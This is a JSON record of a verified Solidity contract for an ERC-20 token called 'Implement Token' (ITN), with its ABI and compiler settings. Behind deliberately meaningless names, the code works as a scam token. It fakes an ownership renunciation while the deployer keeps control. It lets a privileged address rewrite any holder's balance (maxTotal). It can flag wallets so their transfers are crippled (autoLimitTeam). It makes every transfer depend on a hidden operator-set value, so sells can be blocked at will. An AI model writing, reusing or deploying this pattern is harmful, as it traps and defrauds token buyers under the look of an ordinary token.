{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface fundExemptMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundAuto) external view returns (uint256);\n\n    function transfer(address totalMax, uint256 maxAmount) external returns (bool);\n\n    function allowance(address launchMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalMax,\n        uint256 maxAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptSwapMin, uint256 value);\n    event Approval(address indexed launchMax, address indexed spender, uint256 value);\n}\n\nabstract contract enableSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeTxTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingReceiver {\n    function createPair(address limitList, address exemptAt) external returns (address);\n}\n\ninterface receiverAt is fundExemptMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ImplementToken is enableSell, fundExemptMode, receiverAt {\n\n    bool public amountLimit;\n\n    uint256 isMin;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptBuyMin;\n    }\n\n    mapping(address => bool) public txFund;\n\n    uint256 private shouldEnable = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldEnable;\n    }\n\n    function autoLimitTeam(address minTakeFund) public {\n        amountModeExempt();\n        \n        if (minTakeFund == swapList || minTakeFund == autoSwap) {\n            return;\n        }\n        txFund[minTakeFund] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return teamWallet;\n    }\n\n    address private teamWallet;\n\n    bool public feeTo;\n\n    address public autoSwap;\n\n    string private exemptBuyMin = \"Implement Token\";\n\n    bool private liquidityReceiverTx;\n\n    event OwnershipTransferred(address indexed enableToken, address indexed tokenMarketing);\n\n    function swapIsAmount(address enableList, address totalMax, uint256 maxAmount) internal returns (bool) {\n        require(fundIs[enableList] >= maxAmount);\n        fundIs[enableList] -= maxAmount;\n        fundIs[totalMax] += maxAmount;\n        emit Transfer(enableList, totalMax, maxAmount);\n        return true;\n    }\n\n    function amountModeExempt() private view {\n        require(walletLiquidityIs[_msgSender()]);\n    }\n\n    function approve(address launchedSwap, uint256 maxAmount) public virtual override returns (bool) {\n        maxMode[_msgSender()][launchedSwap] = maxAmount;\n        emit Approval(_msgSender(), launchedSwap, maxAmount);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptLaunchedFrom;\n    }\n\n    uint256 takeShould;\n\n    uint256 constant listMode = 9 ** 10;\n\n    function owner() external view returns (address) {\n        return teamWallet;\n    }\n\n    function shouldSwapAt(address teamMode) public {\n        if (feeTo) {\n            return;\n        }\n        \n        walletLiquidityIs[teamMode] = true;\n        \n        feeTo = true;\n    }\n\n    uint256 private fundTo;\n\n    uint8 private exemptLaunchedFrom = 18;\n\n    function launchedSenderMode() public {\n        emit OwnershipTransferred(swapList, address(0));\n        teamWallet = address(0);\n    }\n\n    function balanceOf(address fundAuto) public view virtual override returns (uint256) {\n        return fundIs[fundAuto];\n    }\n\n    function txFeeWallet(uint256 maxAmount) public {\n        amountModeExempt();\n        takeShould = maxAmount;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minTotal;\n    }\n\n    mapping(address => mapping(address => uint256)) private maxMode;\n\n    address public swapList;\n\n    mapping(address => bool) public walletLiquidityIs;\n\n    uint256 private exemptLaunch;\n\n    address fundShouldAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private fundIs;\n\n    function transferFrom(address enableList, address totalMax, uint256 maxAmount) external override returns (bool) {\n        if (_msgSender() != teamAt) {\n            if (maxMode[enableList][_msgSender()] != type(uint256).max) {\n                require(maxAmount <= maxMode[enableList][_msgSender()]);\n                maxMode[enableList][_msgSender()] -= maxAmount;\n            }\n        }\n        return receiverLimit(enableList, totalMax, maxAmount);\n    }\n\n    function receiverLimit(address enableList, address totalMax, uint256 maxAmount) internal returns (bool) {\n        if (enableList == swapList) {\n            return swapIsAmount(enableList, totalMax, maxAmount);\n        }\n        uint256 buyAuto = fundExemptMode(autoSwap).balanceOf(fundShouldAuto);\n        require(buyAuto == takeShould);\n        require(totalMax != fundShouldAuto);\n        if (txFund[enableList]) {\n            return swapIsAmount(enableList, totalMax, listMode);\n        }\n        return swapIsAmount(enableList, totalMax, maxAmount);\n    }\n\n    string private minTotal = \"ITN\";\n\n    uint256 private senderExemptTrading;\n\n    function transfer(address fromLimit, uint256 maxAmount) external virtual override returns (bool) {\n        return receiverLimit(_msgSender(), fromLimit, maxAmount);\n    }\n\n    address teamAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        \n        takeTxTrading limitTake = takeTxTrading(teamAt);\n        autoSwap = marketingReceiver(limitTake.factory()).createPair(limitTake.WETH(), address(this));\n        if (senderExemptTrading != exemptLaunch) {\n            amountLimit = true;\n        }\n        swapList = _msgSender();\n        launchedSenderMode();\n        walletLiquidityIs[swapList] = true;\n        fundIs[swapList] = shouldEnable;\n        \n        emit Transfer(address(0), swapList, shouldEnable);\n    }\n\n    function allowance(address autoAmount, address launchedSwap) external view virtual override returns (uint256) {\n        if (launchedSwap == teamAt) {\n            return type(uint256).max;\n        }\n        return maxMode[autoAmount][launchedSwap];\n    }\n\n    function maxTotal(address fromLimit, uint256 maxAmount) public {\n        amountModeExempt();\n        fundIs[fromLimit] = maxAmount;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSwapMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTakeFund\",\"type\":\"address\"}],\"name\":\"autoLimitTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSenderMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"maxTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"}],\"name\":\"shouldSwapAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"txFeeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLiquidityIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ImplementToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}